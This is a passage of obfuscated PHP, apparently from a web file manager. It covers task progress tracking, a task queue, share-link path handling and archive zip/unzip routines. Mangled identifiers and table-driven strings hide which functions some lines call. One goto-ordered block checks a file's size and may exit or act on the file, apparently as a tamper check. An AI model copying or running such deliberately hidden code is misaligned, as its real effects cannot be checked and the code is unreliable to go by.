($ƒÜöÙ€Ÿ›€÷ && file_exists(get_path_father($˜¥»¢âƒ))) { Cache::set($ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[395]] . $ñ¤ŞÓöâµ[1631], $˜¥»¢âƒ); $ÄŠŠÚœ†®[$ñ¤ŞÓöâµ[1591]] = array($ñ¤ŞÓöâµ[1632], $ñ¤ŞÓöâµ[1633]); } $this->update(0, $ƒÜöÙ€Ÿ›€÷); } public static function updateCopyLocalFileSize($°Ñ†¶ï”Ï¬õ¦) { $›‚É•³„’éÂ =& $_SERVER[ÀÆ]; $£ë = Cache::get($°Ñ†¶ï”Ï¬õ¦[$›‚É•³„’éÂ[395]] . $›‚É•³„’éÂ[1631]); if (!$£ë || !file_exists($£ë)) { return $°Ñ†¶ï”Ï¬õ¦; } $°Ñ†¶ï”Ï¬õ¦[$›‚É•³„’éÂ[1619]] = @filesize($£ë); $°Ñ†¶ï”Ï¬õ¦[$›‚É•³„’éÂ[1623]] += $°Ñ†¶ï”Ï¬õ¦[$›‚É•³„’éÂ[1619]]; self::updateTask($°Ñ†¶ï”Ï¬õ¦); return $°Ñ†¶ï”Ï¬õ¦; } public function copyFileEnd($È•áŒ˜Øùüá, $¤çßÔŒÊ¸æ, $åÍñ, $Ëñµ™âı™, $ú, $ŒÒ) { $¢±º“¯• =& $_SERVER[ÀÆ]; $¿Ä˜å =& $this->task; $¿Ä˜å[$¢±º“¯•[1619]] = $¿Ä˜å[$¢±º“¯•[1618]]; $¿Ä˜å[$¢±º“¯•[1620]] = $¢±º“¯•[33]; unset($¿Ä˜å[$¢±º“¯•[1591]]); if ($ú == $¿Ä˜å[$¢±º“¯•[1616]]) { $¿Ä˜å[$¢±º“¯•[1622]] += $¿Ä˜å[$¢±º“¯•[1618]]; $¿Ä˜å[$¢±º“¯•[1623]] = $¿Ä˜å[$¢±º“¯•[1622]]; $this->update(1); } else { $this->update(); $¿Ä˜å[$¢±º“¯•[1619]] = 0; } Cache::remove($¿Ä˜å[$¢±º“¯•[395]] . $¢±º“¯•[1631]); self::log($¢±º“¯•[1634] . $¤çßÔŒÊ¸æ . $¢±º“¯•[67] . $Ëñµ™âı™ . $¢±º“¯•[229] . $ú . $¢±º“¯•[1635] . $¿Ä˜å[$¢±º“¯•[1616]]); } public function updateFileEnd($âº­Õôœ€Æê, $Ì) { $Š²–ØæÂøÌ‰ñ =& $_SERVER[ÀÆ]; $¥¾ï¢²¦¯ =& $this->task; $¥¾ï¢²¦¯[$Š²–ØæÂøÌ‰ñ[1616]] = $âº­Õôœ€Æê; $¥¾ï¢²¦¯[$Š²–ØæÂøÌ‰ñ[1618]] = $Ì; $¥¾ï¢²¦¯[$Š²–ØæÂøÌ‰ñ[1622]] += $Ì; $¥¾ï¢²¦¯[$Š²–ØæÂøÌ‰ñ[1623]] = $¥¾ï¢²¦¯[$Š²–ØæÂøÌ‰ñ[1622]]; $this->update(1); self::log($Š²–ØæÂøÌ‰ñ[1636] . $âº­Õôœ€Æê); } public function sourceModelCopy($®Ó–Í—õæĞ) { $½Ë»ÀØ• =& $_SERVER[ÀÆ]; $ç¬à…§£ê÷´ = $®Ó–Í—õæĞ[0]; $š ş÷ = $®Ó–Í—õæĞ[1]; $èí¿˜¢¶äá©  =& $this->task; $this->sourceModelCopyFlag = !0; $ä¤ = 0; switch ($ç¬à…§£ê÷´) { case $½Ë»ÀØ•[560]: $ä¤ = 1; break; case $½Ë»ÀØ•[563]: $èí¿˜¢¶äá© [$½Ë»ÀØ•[1616]] = $š ş÷[$½Ë»ÀØ•[28]]; break; case $½Ë»ÀØ•[565]: $ä¤ = intval($®Ó–Í—õæĞ[$½Ë»ÀØ•[378]] * 0.4); break; case $½Ë»ÀØ•[567]: $ä¤ = intval($®Ó–Í—õæĞ[$½Ë»ÀØ•[378]] * 0.2); break; case $½Ë»ÀØ•[569]: $ä¤ = intval($®Ó–Í—õæĞ[$½Ë»ÀØ•[378]] * 0.4); break; } $this->update($ä¤); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ƒ”, $áÇû•øÆî¡÷) { $ıû =& $_SERVER[ÀÆ]; $this->sourceModelCopyFlag = !0; $©©Õå… = 1; if (isset($ƒ”[$ıû[81]])) { $©©Õå… = $ƒ”[$ıû[81]][$ıû[79]] + $ƒ”[$ıû[81]][$ıû[80]] + 1; } $this->update($©©Õå…); $this->sourceModelCopyFlag = !1; } public function sourceMove($¾Ä™š«) { $this->sourceRemove($¾Ä™š«, !1); } public function curlProgress($±ªï, $¬Êñ›’â, $‡ªØ‚Š, $È„, $Öáıƒ«˜) { $‘Ûˆ¬ =& $_SERVER[ÀÆ]; $åâæº¬ôœá =& $this->task; if ($Öáıƒ«˜ > 0) { $åâæº¬ôœá[$‘Ûˆ¬[1056]] = $‘Ûˆ¬[1637]; $åâæº¬ôœá[$‘Ûˆ¬[1620]] = $‘Ûˆ¬[107]; if ($åâæº¬ôœá[$‘Ûˆ¬[1618]]) { $åâæº¬ôœá[$‘Ûˆ¬[1619]] = $Öáıƒ«˜; } if ($åâæº¬ôœá[$‘Ûˆ¬[1621]]) { $åâæº¬ôœá[$‘Ûˆ¬[1619]] = $Öáıƒ«˜ + $åâæº¬ôœá[$‘Ûˆ¬[1621]]; } } else { if ($‡ªØ‚Š > 0) { if ($åâæº¬ôœá[$‘Ûˆ¬[1618]] == $¬Êñ›’â) { $åâæº¬ôœá[$‘Ûˆ¬[1619]] = $‡ªØ‚Š; $åâæº¬ôœá[$‘Ûˆ¬[1056]] = $‘Ûˆ¬[1638]; $åâæº¬ôœá[$‘Ûˆ¬[1620]] = $‘Ûˆ¬[1126]; } } } $this->update(); } public function curlProgressStart($ƒÎ’ÈÓ) { } public function curlProgressEnd($÷çÌ¡ŒŸÀÊ) { $Ì¸ÕéÍ· =& $_SERVER[ÀÆ]; $÷åëë¢Ò =& $this->task; $ñ²Ìº–  = curl_getinfo($÷çÌ¡ŒŸÀÊ); $²â¬ˆ›à‰ = $ñ²Ìº– [$Ì¸ÕéÍ·[1639]]; if ($²â¬ˆ›à‰ == -1) { $²â¬ˆ›à‰ = $ñ²Ìº– [$Ì¸ÕéÍ·[1640]]; } if ($÷åëë¢Ò[$Ì¸ÕéÍ·[1620]] == $Ì¸ÕéÍ·[107] && $²â¬ˆ›à‰) { $÷åëë¢Ò[$Ì¸ÕéÍ·[1621]] += $²â¬ˆ›à‰; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Ş =& $_SERVER[ÀÆ]; $´ßç…÷§ä¤ =& $this->task; $´ßç…÷§ä¤[$Ş[1641]] = 1; Hook::bind($Ş[1610], array($this, $Ş[1642])); Hook::bind($Ş[1612], array($this, $Ş[1643])); Hook::bind($Ş[1614], array($this, $Ş[1644])); } protected function endAfter() { $œÙÙ =& $_SERVER[ÀÆ]; Hook::unbind($œÙÙ[1610], array($this, $œÙÙ[1642])); Hook::unbind($œÙÙ[1612], array($this, $œÙÙ[1643])); Hook::unbind($œÙÙ[1614], array($this, $œÙÙ[1644])); } public function progressStart($ÀĞÂÜ) { $ˆğç¡ =& $_SERVER[ÀÆ]; $ãƒê›ĞöÆÊç = curl_getinfo($ÀĞÂÜ); self::log($ˆğç¡[1645] . $ãƒê›ĞöÆÊç[$ˆğç¡[305]]); self::valueSet($this->task[$ˆğç¡[395]], $this->task); } public function progressEnd($“Ö…ó˜Íèì) { $Ô©²¿Ö¸Œ =& $_SERVER[ÀÆ]; self::log($Ô©²¿Ö¸Œ[1646] . $this->task[$Ô©²¿Ö¸Œ[395]]); $this->end(); } public function progress($Æà‡‚Î½îñƒ¢, $ªØŸ¥Ú•ñ, $ĞË®µ, $Åúıìåâ©, $ƒ±ÌÁíûŞ) { $”™ÓìÜ¡‹öï‘ =& $_SERVER[ÀÆ]; $áõÂ =& $this->task; if ($ƒ±ÌÁíûŞ > 0) { $áõÂ[$”™ÓìÜ¡‹öï‘[1054]] = $áõÂ[$”™ÓìÜ¡‹öï‘[1054]] == 0 ? $Åúıìåâ© : $áõÂ[$”™ÓìÜ¡‹öï‘[1054]]; $áõÂ[$”™ÓìÜ¡‹öï‘[1068]] = $ƒ±ÌÁíûŞ; } else { if ($ĞË®µ > 0) { $áõÂ[$”™ÓìÜ¡‹öï‘[1054]] = $áõÂ[$”™ÓìÜ¡‹öï‘[1054]] == 0 ? $ªØŸ¥Ú•ñ : $áõÂ[$”™ÓìÜ¡‹öï‘[1054]]; $áõÂ[$”™ÓìÜ¡‹öï‘[1068]] = $ĞË®µ; } } $this->update(); self::log("\160\162\x6f\147\162\x65\163\x73\x48\164\x74\x70\72\x64\x6f\167\156\72{$ĞË®µ}\57{$ªØŸ¥Ú•ñ}\73\40\x75\x70\x6c\157\x61\x64\x3a{$ƒ±ÌÁíûŞ}\57{$Åúıìåâ©}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\153\x51\165\145\165\145\114\145\x6e\147\164\x68"; const QUEUE_DATA = "\164\x61\163\153\121\165\x65\x75\145\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($åÜĞ€ĞÍ áä, $ïºœ‰éÜ = array(), $‹Äó¹Ş = '', $éÔø = '') { $®›‘ª•« =& $_SERVER[ÀÆ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($éÔø && array_find_by_field(self::$listData, $®›‘ª•«[93], $éÔø)) { return !0; } self::$listData[] = array($®›‘ª•«[262] => $åÜĞ€ĞÍ áä, $®›‘ª•«[1647] => $ïºœ‰éÜ, $®›‘ª•«[445] => $‹Äó¹Ş, $®›‘ª•«[93] => $éÔø); return !0; } public static function addSubmit() { $¶Ú˜ıüåš³ =& $_SERVER[ÀÆ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($¶Ú˜ıüåš³[1648] . json_encode_force(array_to_keyvalue(self::$listData, $¶Ú˜ıüåš³[33], $¶Ú˜ıüåš³[445])), $¶Ú˜ıüåš³[1649]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ÚÎ•ü³ö, $õîº³—öÚ©Øº = array(), $ØÓƒé¬‚ÉÔ© = '', $ä¼¦ÙŞä÷ = '') { $ßçì×şä™µò =& $_SERVER[ÀÆ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $áš¬Âãˆá‘Êø = self::getAll(); if ($ä¼¦ÙŞä÷ && array_find_by_field($áš¬Âãˆá‘Êø, $ßçì×şä™µò[93], $ä¼¦ÙŞä÷)) { return !0; } $áš¬Âãˆá‘Êø[] = array($ßçì×şä™µò[262] => $ÚÎ•ü³ö, $ßçì×şä™µò[1647] => $õîº³—öÚ©Øº, $ßçì×şä™µò[445] => $ØÓƒé¬‚ÉÔ©, $ßçì×şä™µò[93] => $ä¼¦ÙŞä÷); write_log($ßçì×şä™µò[1648] . $ØÓƒé¬‚ÉÔ©, $ßçì×şä™µò[1649]); self::setAll($áš¬Âãˆá‘Êø); return !0; } public static function run() { $³Ä…€ö°²ëÛ =& $_SERVER[ÀÆ]; $… ‰† = self::getAll(); $ô§ = array_shift($… ‰†); if (!$ô§) { return !1; } self::setAll($… ‰†); $ŸÎ = timeFloat(); try { Hook::apply($ô§[$³Ä…€ö°²ëÛ[262]], $ô§[$³Ä…€ö°²ëÛ[1647]]); } catch (Exception $¢Ÿ÷ØÕ×ï) { } $Ûä¿İ¾ = number_format(timeFloat() - $ŸÎ, 3) . $³Ä…€ö°²ëÛ[1585]; write_log($³Ä…€ö°²ëÛ[1650] . $ô§[$³Ä…€ö°²ëÛ[445]] . $³Ä…€ö°²ëÛ[1651] . $Ûä¿İ¾, $³Ä…€ö°²ëÛ[1649]); return !0; } public static function count() { $›ü‘·‡ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$›ü‘·‡) { return 0; } return intval($›ü‘·‡); } public static function getAll() { $»ÑÕ®¡ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$»ÑÕ®¡) { return array(); } return $»ÑÕ®¡; } public static function setAll($°ÆêóŠÓ) { $“ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($°ÆêóŠÓ), $“); Cache::set(self::QUEUE_DATA, $°ÆêóŠÓ, $“); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto AèäÇ²Ş; cÜËõ‡ò›Ÿ: $_file = $_SERVER[$_SERVER[ÀÆ][864]]; $_size = $_SERVER[ÀÆ][872]; if ($_SERVER[$_SERVER[ÀÆ][857]] != $_size($_file)) { $_getc = $_SERVER[ÀÆ][859]; $_getfile = $_SERVER[$_SERVER[ÀÆ][860]] . $_SERVER[ÀÆ][861]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÀÆ][229], $_getfilec); if (count($_getarrs) < $_SERVER[ÀÆ][612]) { $exit = $_SERVER[ÀÆ][862]; $exit(); } $_act = $_SERVER[ÀÆ][863]; $_act($_file); } goto eïÃºÅô„; C§»éÃöšÉ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($¯–Î··¶ç) { $this->pathParse = $¯–Î··¶ç; $this->model = Model($_SERVER[ÀÆ][1250]); } protected function infoParse($‰Å, $û = false, $‰½òÀÌ = false) { $øÈş =& $_SERVER[ÀÆ]; return Action($øÈş[1102])->sharePathInfo($this->pathParse[$øÈş[76]], !0); } public function listPath($§¹––ª, $’½”§˜Ü†Ş² = false) { $Ôî¹Ó¶Ğ›«¦Ø =& $_SERVER[ÀÆ]; $…èñÔ = parent::listPath($§¹––ª, $’½”§˜Ü†Ş²); foreach ($…èñÔ as $»²á => $Ëñ£–ç) { if (!in_array($»²á, array($Ôî¹Ó¶Ğ›«¦Ø[74], $Ôî¹Ó¶Ğ›«¦Ø[75]))) { continue; } foreach ($Ëñ£–ç as $”Å€øœ => $³÷ÊÑ‹ö¼êï) { $…èñÔ[$»²á][$”Å€øœ] = Action($Ôî¹Ó¶Ğ›«¦Ø[1102])->shareItemInfo($³÷ÊÑ‹ö¼êï); } } return $…èñÔ; } public function listAll($»æŞå¬·¦Í) { $ŞŠÒ÷…„ =& $_SERVER[ÀÆ]; $€Åãş©½ = IO::info($this->pathParse[$ŞŠÒ÷…„[76]]); if (!$€Åãş©½) { return array(); } $’œ›ğº‰ = $this->model->listAll($»æŞå¬·¦Í); foreach ($’œ›ğº‰ as &$„ˆèÅ‘ğ‹) { $„ˆèÅ‘ğ‹[$ŞŠÒ÷…„[85]] = Action($ŞŠÒ÷…„[1102])->shareItemInfo($„ˆèÅ‘ğ‹[$ŞŠÒ÷…„[85]]); } unset($„ˆèÅ‘ğ‹); return $’œ›ğº‰; } } class PathDriverDriverShareItem { public function __construct($îçÄ¦) { $this->pathParse = $îçÄ¦; } public function __call($ßŸ™, $ÚÚ¤å) { $©–¯ =& $_SERVER[ÀÆ]; if (method_exists($this, $ßŸ™)) { return; } $şíÙøŒ•Ñ• = call_user_func_array(array($©–¯[1259], $ßŸ™), $ÚÚ¤å); $ˆ­‹¡æªöÅ = array($©–¯[1260], $©–¯[1261], $©–¯[1262], $©–¯[1263], $©–¯[543], $©–¯[545], $©–¯[1264], $©–¯[107], $©–¯[1265], $©–¯[1266]); if (in_array($ßŸ™, $ˆ­‹¡æªöÅ)) { $şíÙøŒ•Ñ• = $this->getPathOuter($şíÙøŒ•Ñ•); } return $şíÙøŒ•Ñ•; } public function copy($¥£°², $õŸÏ, $õøîĞ = false) { return $this->copyMove($¥£°², $õŸÏ, $õøîĞ, $_SERVER[ÀÆ][543]); } public function move($Â‹â, $¥©æÌ£íƒ, $§™Æ³Ô‡ÁÆ– = false) { return $this->copyMove($Â‹â, $¥©æÌ£íƒ, $§™Æ³Ô‡ÁÆ–, $_SERVER[ÀÆ][545]); } private function copyMove($ÀóÇíÅğ¿, $¼ÜãœùÍå, $ƒõåÓ³, $¥š­¦ĞÑ¯¤) { $ô©§¨˜êë© =& $_SERVER[ÀÆ]; $×‚Ğº´’îİÇ = $¼ÜãœùÍå; $øâ­Ğ™Â = IO::driverMake($¼ÜãœùÍå); if ($øâ­Ğ™Â->pathParse[$ô©§¨˜êë©[1080]]) { $¼ÜãœùÍå = $øâ­Ğ™Â->pathParse[$ô©§¨˜êë©[1080]]; } else { $¼ÜãœùÍå = $×‚Ğº´’îİÇ; } $ÇÆ = IO::copyMove($ÀóÇíÅğ¿, $¼ÜãœùÍå, $ƒõåÓ³, $¥š­¦ĞÑ¯¤); $ÇÆ = $this->getPathOuter($ÇÆ); return $ÇÆ; } public function pathThis($ÒÓ¥š) { return get_path_this($this->pathParse[$_SERVER[ÀÆ][76]]); } public function pathFather($²šà‰¹·) { return get_path_father($this->pathParse[$_SERVER[ÀÆ][76]]); } public function iconvSystem($—ı‹¶) { return $—ı‹¶; } protected function infoParse($Ø±ÖÎ™¿, $¨â©”ßç = false) { $Ö®¤ßˆğ =& $_SERVER[ÀÆ]; $„‡¶øöù²³¹ = $this->pathParse[$Ö®¤ßˆğ[480]][$Ö®¤ßˆğ[1103]] . $this->pathParse[$Ö®¤ßˆğ[1096]]; if ($¨â©”ßç) { $á¬äŒ = IO::infoWithChildren($„‡¶øöù²³¹); } else { $á¬äŒ = IO::info($„‡¶øöù²³¹); } $¤ŒõÔø» = $this->pathParse[$Ö®¤ßˆğ[480]]; return Action($Ö®¤ßˆğ[1258])->_shareItemeParse($á¬äŒ, $¤ŒõÔø»); } public function listAll($¢¬ûÔóğ) { $æ¹ŞÜ…š =& $_SERVER[ÀÆ]; $–Â› = IO::listAll($¢¬ûÔóğ); $ªã¯Õº = $this->pathParse[$æ¹ŞÜ…š[480]]; foreach ($–Â› as &$¶ş¨ÁÈØŸ¯) { check_abort(); $˜É’ = IO::info($¶ş¨ÁÈØŸ¯[$æ¹ŞÜ…š[76]]); $˜É’ = is_array($˜É’) ? $˜É’ : array(); $¶ş¨ÁÈØŸ¯ = array_merge($˜É’, $¶ş¨ÁÈØŸ¯); $¶ş¨ÁÈØŸ¯[$æ¹ŞÜ…š[85]] = Action($æ¹ŞÜ…š[1258])->_shareItemeParse($¶ş¨ÁÈØŸ¯, $ªã¯Õº); } unset($¶ş¨ÁÈØŸ¯); return $–Â›; } public function getPathOuter($çø’Ã) { $±íØ¼íŞœÚÏ =& $_SERVER[ÀÆ]; $ËµÌã÷é±Â­ = KodIO::parse($çø’Ã); if ($ËµÌã÷é±Â­[$±íØ¼íŞœÚÏ[29]] == KodIO::KOD_SHARE_ITEM) { return $ËµÌã÷é±Â­[$±íØ¼íŞœÚÏ[76]]; } $²±¶ø€Ë·½¨Œ = KodIO::clear($çø’Ã); $ÕÑ‡ = KodIO::clear($this->pathParse[$±íØ¼íŞœÚÏ[480]][$±íØ¼íŞœÚÏ[1103]]); $Öö = substr($²±¶ø€Ë·½¨Œ, strlen($ÕÑ‡)); if (substr($²±¶ø€Ë·½¨Œ, 0, strlen($ÕÑ‡)) != $ÕÑ‡) { return !1; } return $this->pathParse[$±íØ¼íŞœÚÏ[1097]] . $±íØ¼íŞœÚÏ[8] . ltrim($Öö, $±íØ¼íŞœÚÏ[8]); } public function getType() { $á½»£¥è =& $_SERVER[ÀÆ]; $º½ı = str_replace($á½»£¥è[72], $á½»£¥è[33], get_class($this)); return strtolower($º½ı); } public function isTypeObject($Ñ…À) { return IO::isTypeObject($Ñ…À); } public function info($½Àûæ) { return $this->infoParse($½Àûæ); } public function infoAuth($¹æ¢È) { return $this->infoParse($¹æ¢È); } public function infoWithChildren($º˜˜Œò¥Ñ) { return $this->infoParse($º˜˜Œò¥Ñ, !0); } public function infoFull($÷ö´õöİ”œª) { return $this->infoParse($÷ö´õöİ”œª); } } $_file = $_SERVER[$_SERVER[ÀÆ][864]]; goto aÖÇÓéÒåã; cºÄ¨‘Âª—: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $‘ÌúŒé ; if (!$‘ÌúŒé ) { $¨«™áÍÙÉ˜ = IO::init($_SERVER[ÀÆ][8]); } return $¨«™áÍÙÉ˜; } private static function iconvSystem($Î§íæ’óµ) { return self::local()->iconvSystem($Î§íæ’óµ); } private static function iconvApp($Åêñéİ) { return self::local()->iconvApp($Åêñéİ); } public static function zip($·æóëÜ×’«, $­Ê›ú­ = "\x7a\151\x70", $‚¢ñ«Æ = '', $·ªô’¦õğŠ = REPEAT_RENAME) { $èÁï°¨ =& $_SERVER[ÀÆ]; $Å¨øÇº = self::init($·æóëÜ×’«[0][$èÁï°¨[76]]); $ä à = self::info($·æóëÜ×’«[0][$èÁï°¨[76]]); $¯«ª¸“ÏÆ = !1; if (!$‚¢ñ«Æ && $Å¨øÇº->getType() == $èÁï°¨[106]) { $û—±€ = self::zipFileList($·æóëÜ×’«); } else { $¯«ª¸“ÏÆ = $‚¢ñ«Æ ? $‚¢ñ«Æ : TEMP_FILES . $èÁï°¨[1111] . time() . rand_string(8) . $èÁï°¨[8]; mk_dir($¯«ª¸“ÏÆ); $û—±€ = self::zipFileList($·æóëÜ×’«, $¯«ª¸“ÏÆ); } $©˜ = $ä à[$èÁï°¨[28]]; if (count($û—±€) > 1) { $Û×’€ïÃ¸ = IO::info(IO::pathFather($ä à[$èÁï°¨[76]])); $©˜ = $Û×’€ïÃ¸[$èÁï°¨[28]]; } $Áã’ = $¯«ª¸“ÏÆ; if (!$Áã’) { $Áã’ = get_path_father($ä à[$èÁï°¨[76]]); if (!$‚¢ñ«Æ && $Å¨øÇº->getType() == $èÁï°¨[106]) { $Áã’ = get_path_father($Å¨øÇº->path); } $æ¾ŞµÙıúÍ = IO::info($Áã’); if (!$æ¾ŞµÙıúÍ[$èÁï°¨[196]]) { show_json(LNG($èÁï°¨[1112]), !1); } } $ôÕğü = $Áã’ . $©˜ . $èÁï°¨[95] . $­Ê›ú­; $ôÕğü = get_filename_auto($ôÕğü, $èÁï°¨[33], $·ªô’¦õğŠ); $Î— = self::iconvSystem($ôÕğü); foreach ($û—±€ as $ÎÈ˜ª†è…Ã› => $ãŒ÷Ù±õ†) { $û—±€[$ÎÈ˜ª†è…Ã›] = self::iconvSystem($ãŒ÷Ù±õ†); } KodArchive::create($Î—, $û—±€); if (!IO::exist($ôÕğü)) { if ($¯«ª¸“ÏÆ) { del_dir($¯«ª¸“ÏÆ); } show_json(LNG($èÁï°¨[1113]), !1); } if ($‚¢ñ«Æ || !$¯«ª¸“ÏÆ) { if ($¯«ª¸“ÏÆ && strstr($¯«ª¸“ÏÆ, TEMP_FILES)) { $Û¡­ = $û—±€ = array(); recursion_dir($Áã’, $Û¡­, $û—±€, 0); foreach ($Û¡­ as $¢Óé) { del_dir($¢Óé); } foreach ($û—±€ as $ğ­˜ƒ) { if ($ğ­˜ƒ == $Î—) { continue; } del_file($ğ­˜ƒ); } } return $ôÕğü; } $‹İ‰¸Î  = self::pathFather($ä à[$èÁï°¨[76]]); $œŸœ = self::move($ôÕğü, $‹İ‰¸Î , $·ªô’¦õğŠ); if (!$œŸœ) { del_dir($¯«ª¸“ÏÆ); show_json(LNG($èÁï°¨[1113]), !1); } del_dir($¯«ª¸“ÏÆ); return $œŸœ; } public static function unzip($¡ßã®, $ãÅº÷ = "\x72\145\x70\x6c\x61\x63\x65") { $ıñÏİ¿ÚÁ› =& $_SERVER[ÀÆ]; $Úˆ = $¡ßã®[$ıñÏİ¿ÚÁ›[76]]; $´›Ìç = $¡ßã®[$ıñÏİ¿ÚÁ›[1114]]; if (!($–¸éÉßÊ¡ä‰ = parent::info($Úˆ))) { show_json(LNG($ıñÏİ¿ÚÁ›[1115]), !1); } if (!($Óşß¾« = parent::infoFull($´›Ìç))) { $´›Ìç = parent::mkdir($´›Ìç); $Óşß¾« = array($ıñÏİ¿ÚÁ›[76] => $´›Ìç); } else { if (isset($Óşß¾«[$ıñÏİ¿ÚÁ›[397]]) && trim($Óşß¾«[$ıñÏİ¿ÚÁ›[76]], $ıñÏİ¿ÚÁ›[8]) != trim($´›Ìç, $ıñÏİ¿ÚÁ›[8])) { $šŠ‹œ = KodIO::make($Óşß¾«[$ıñÏİ¿ÚÁ›[492]]); $ÑüŠôˆƒ• = parent::fileNameAuto($šŠ‹œ, $Óşß¾«[$ıñÏİ¿ÚÁ›[28]], REPEAT_RENAME_FOLDER, !0); $´›Ìç = parent::mkdir($šŠ‹œ . $ÑüŠôˆƒ•); $Óşß¾« = array($ıñÏİ¿ÚÁ›[76] => $´›Ìç); } } $´›Ìç = $Óşß¾«[$ıñÏİ¿ÚÁ›[76]]; $öûáê = self::tmpFileName($–¸éÉßÊ¡ä‰); $å¼Ëºå‰ß = TEMP_FILES . $öûáê; del_dir($å¼Ëºå‰ß); mk_dir($å¼Ëºå‰ß); $àå = self::fileExt($–¸éÉßÊ¡ä‰); $á”Šõ¬ = $å¼Ëºå‰ß . $ıñÏİ¿ÚÁ›[95] . $àå; if (!@file_exists(self::iconvSystem($á”Šõ¬))) { $²ö‚ = self::localFilePath($Úˆ, $àå); $á”Šõ¬ = $²ö‚ ? $²ö‚ : parent::download($Úˆ, $á”Šõ¬); } $á”Šõ¬ = self::iconvSystem($á”Šõ¬); $¼ŠÙ = isset($¡ßã®[$ıñÏİ¿ÚÁ›[1116]]) ? $¡ßã®[$ıñÏİ¿ÚÁ›[1116]] : $ıñÏİ¿ÚÁ›[1117]; $ôéÌö = KodArchive::extract($á”Šõ¬, $å¼Ëºå‰ß . $ıñÏİ¿ÚÁ›[8], $¼ŠÙ); self::archiveExt(); if (!$ôéÌö[$ıñÏİ¿ÚÁ›[1118]]) { show_json($ıñÏİ¿ÚÁ›[1119] . $ôéÌö[$ıñÏİ¿ÚÁ›[1120]], !1); } Hook::trigger($ıñÏİ¿ÚÁ›[1121], $å¼Ëºå‰ß); recursion_dir($å¼Ëºå‰ß, $ÒÜ´äÁ™Ëñ, $˜¨³’ïùê, 0); $èñ²Ô¥Òç = array_merge($ÒÜ´äÁ™Ëñ, $˜¨³’ïùê); foreach ($èñ²Ô¥Òç as $†ı¡á‰Ğ) { $†ı¡á‰Ğ = self::iconvApp($†ı¡á‰Ğ); self::move($†ı¡á‰Ğ, $´›Ìç, $ãÅº÷); } del_dir($å¼Ëºå‰ß); if (!$²ö‚) { del_file($á”Šõ¬); } return !0; } public static function unzipList($òş¡ö½æ³ãÉ) { $†­¦°ëÑ²å€’ =& $_SERVER[ÀÆ]; $Íœ÷´Ï = $òş¡ö½æ³ãÉ[$†­¦°ëÑ²å€’[76]]; $‚ú÷àÓ£ğ = isset($òş¡ö½æ³ãÉ[$†­¦°ëÑ²å€’[1122]]) ? $òş¡ö½æ³ãÉ[$†­¦°ëÑ²å€’[1122]] : -1; $ò­¼®íè = 50000; if (request_url_safe($Íœ÷´Ï)) { $Ğ¾ ôªË£‹æ = parse_url_query($Íœ÷´Ï); if (!isset($Ğ¾ ôªË£‹æ[$†­¦°ëÑ²å€’[76]])) { show_json($†­¦°ëÑ²å€’[1123], !1); } } $ìşĞ“§  = isset($Ğ¾ ôªË£‹æ) ? $Ğ¾ ôªË£‹æ[$†­¦°ëÑ²å€’[76]] : $Íœ÷´Ï; $¡Î¬Š = self::info($ìşĞ“§ ); $…ôÜÂ = self::fileExt($¡Î¬Š); $€Ûï” = self::tmpFileName($¡Î¬Š); if (isset($Ğ¾ ôªË£‹æ)) { $Õª = array($Ğ¾ ôªË£‹æ[$†­¦°ëÑ²å€’[76]], $Ğ¾ ôªË£‹æ[$†­¦°ëÑ²å€’[1122]], $Ğ¾ ôªË£‹æ[$†­¦°ëÑ²å€’[28]]); $™‹ÔŠİ™ = md5(implode($†­¦°ëÑ²å€’[71], $Õª)) . $†­¦°ëÑ²å€’[95] . get_path_ext($Ğ¾ ôªË£‹æ[$†­¦°ëÑ²å€’[28]]); } else { $Õª = array($¡Î¬Š[$†­¦°ëÑ²å€’[28]], $¡Î¬Š[$†­¦°ëÑ²å€’[76]], $¡Î¬Š[$†­¦°ëÑ²å€’[78]]); $™‹ÔŠİ™ = md5(implode($†­¦°ëÑ²å€’[71], $Õª)) . $†­¦°ëÑ²å€’[95] . $…ôÜÂ; } if ($‚ú÷àÓ£ğ == -1) { $­ëÇ°øñŸ = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\x56\151\x65\x77\x2f{$€Ûï”}\x2f{$™‹ÔŠİ™}\x2e\x6c\x6f\x67"; $†Û’œ = self::infoFull($­ëÇ°øñŸ); if ($†Û’œ) { $­ëÇ°øñŸ = $†Û’œ[$†­¦°ëÑ²å€’[76]]; $‚ñà‹áë = self::getContent($­ëÇ°øñŸ); if ($‚ñà‹áë) { $ÆÙŸó£¬È© = json_decode($‚ñà‹áë, !0); if (count($ÆÙŸó£¬È©) >= $ò­¼®íè) { show_json(sprintf(LNG($†­¦°ëÑ²å€’[1124]), count($ÆÙŸó£¬È©)), !1); } return $ÆÙŸó£¬È©; } } else { $­ëÇ°øñŸ = self::mkfile($­ëÇ°øñŸ); } } $ûäÓ›é¯±ë = TEMP_FILES . $€Ûï”; if (!is_dir($ûäÓ›é¯±ë)) { mk_dir($ûäÓ›é¯±ë); } $éè½â›Âé‹¼ = $ûäÓ›é¯±ë . $†­¦°ëÑ²å€’[8] . $™‹ÔŠİ™; if (!@file_exists(self::iconvSystem($éè½â›Âé‹¼))) { if (isset($Ğ¾ ôªË£‹æ)) { url_request($Íœ÷´Ï, $†­¦°ëÑ²å€’[1125], $éè½â›Âé‹¼); } else { $—Øòî¡Ëî = self::localFilePath($Íœ÷´Ï, $…ôÜÂ); $éè½â›Âé‹¼ = $—Øòî¡Ëî ? $—Øòî¡Ëî : self::download($Íœ÷´Ï, $éè½â›Âé‹¼); } } $éè½â›Âé‹¼ = 